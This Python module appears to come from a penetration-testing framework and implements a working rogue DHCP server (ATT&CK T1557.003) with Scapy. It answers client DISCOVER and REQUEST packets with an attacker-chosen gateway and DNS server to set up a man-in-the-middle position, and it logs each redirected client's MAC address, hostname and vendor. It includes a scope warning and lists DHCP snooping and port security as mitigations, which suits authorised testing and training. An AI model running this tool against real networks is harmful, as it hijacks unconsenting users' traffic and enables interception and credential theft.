"""
dhcp — Rogue DHCP Server / DHCP Spoofing
ATT&CK: T1557.003 (Adversary-in-the-Middle: DHCP Spoofing)

Answers DHCP DISCOVER/REQUEST on the local segment, handing out a fake gateway
and DNS so the operator can position as MITM. Does NOT win the race against a
legitimate DHCP server on its own (clients accept the first OFFER); pair with
DHCP starvation or run during a maintenance window.

WARNING: replies to ANY client broadcasting on the same L2 segment. Ensure the
segment is isolated (dedicated VLAN/lab port) so out-of-scope hosts are not hit.

Mitigation: DHCP Snooping (trust only the real server port); port security.
"""

from datetime import datetime

from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, get_if_hwaddr

from core.common import require_root, ip_to_int, int_to_ip

NAME = "dhcp"
DESCRIPTION = "Rogue DHCP server — redirect client gateway and DNS"
ATTCK_ID = "T1557.003"


class _IPPool:
    def __init__(self, start_ip, end_ip):
        self.start = ip_to_int(start_ip)
        self.end = ip_to_int(end_ip)
        self.leases = {}
        self.used = set()

    def get(self, mac):
        if mac in self.leases:
            return self.leases[mac]
        for candidate in range(self.start, self.end + 1):
            ip = int_to_ip(candidate)
            if ip not in self.used:
                self.used.add(ip)
                self.leases[mac] = ip
                return ip
        raise RuntimeError("IP pool exhausted — widen --pool")


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help="Rogue DHCP server")
    p.add_argument("-i", "--iface", required=True, help="Interface, e.g. eth0")
    p.add_argument("--pool", required=True, help="IP range, e.g. 10.0.0.100-10.0.0.150")
    p.add_argument("--netmask", default="255.255.255.0")
    p.add_argument("--gateway", required=True, help="Gateway to hand out (often attacker IP)")
    p.add_argument("--dns", required=True, help="Fake DNS server to hand out")
    p.add_argument("--server-ip", dest="server_ip", required=True, help="Rogue server IP")
    p.add_argument("--lease", type=int, default=120, help="Lease seconds (default 120)")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _opt(pkt, name):
    if DHCP not in pkt:
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == name:
            return opt[1]
    return None


def _dec(val):
    return val.decode(errors="replace") if isinstance(val, bytes) else val


def run(args, logger):
    require_root()
    start_ip, end_ip = args.pool.split("-")
    pool = _IPPool(start_ip, end_ip)
    server_mac = get_if_hwaddr(args.iface)
    served = {}

    def reply(request_pkt, msg_type, offered_ip, xid):
        return (
            Ether(src=server_mac, dst=request_pkt[Ether].src)
            / IP(src=args.server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, xid=xid, yiaddr=offered_ip, siaddr=args.server_ip,
                    chaddr=request_pkt[BOOTP].chaddr, flags=request_pkt[BOOTP].flags)
            / DHCP(options=[
                ("message-type", msg_type),
                ("server_id", args.server_ip),
                ("lease_time", args.lease),
                ("subnet_mask", args.netmask),
                ("router", args.gateway),
                ("name_server", args.dns),
                "end",
            ])
        )

    def handle(pkt):
        if DHCP not in pkt or Ether not in pkt or BOOTP not in pkt:
            return
        msg_type = _opt(pkt, "message-type")
        mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        hostname = _dec(_opt(pkt, "hostname"))
        vendor = _dec(_opt(pkt, "vendor_class_id"))

        if msg_type == 1:  # DISCOVER
            offered = pool.get(mac)
            sendp(reply(pkt, "offer", offered, xid), iface=args.iface, verbose=False)
            logger.info("OFFER mac=%s host=%s vendor=%s -> %s",
                        mac, hostname, vendor, offered)
        elif msg_type == 3:  # REQUEST
            requested = _dec(_opt(pkt, "requested_addr")) or pool.get(mac)
            sendp(reply(pkt, "ack", requested, xid), iface=args.iface, verbose=False)
            served[mac] = {"ip": requested, "hostname": hostname, "vendor": vendor,
                           "time": datetime.now().isoformat(timespec="seconds")}
            logger.info("ACK   mac=%s host=%s vendor=%s -> %s (fake_dns=%s fake_gw=%s)",
                        mac, hostname, vendor, requested, args.dns, args.gateway)

    logger.info("Rogue DHCP | iface=%s pool=%s fake_dns=%s fake_gw=%s lease=%ss",
                args.iface, args.pool, args.dns, args.gateway, args.lease)
    try:
        sniff(iface=args.iface, filter="udp and (port 67 or port 68)",
              prn=handle, store=False)
    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Stopped. Clients redirected: %d", len(served))
        for mac, info in served.items():
            logger.info("  - %s (%s, %s) -> %s @ %s",
                        mac, info["hostname"], info["vendor"], info["ip"], info["time"])
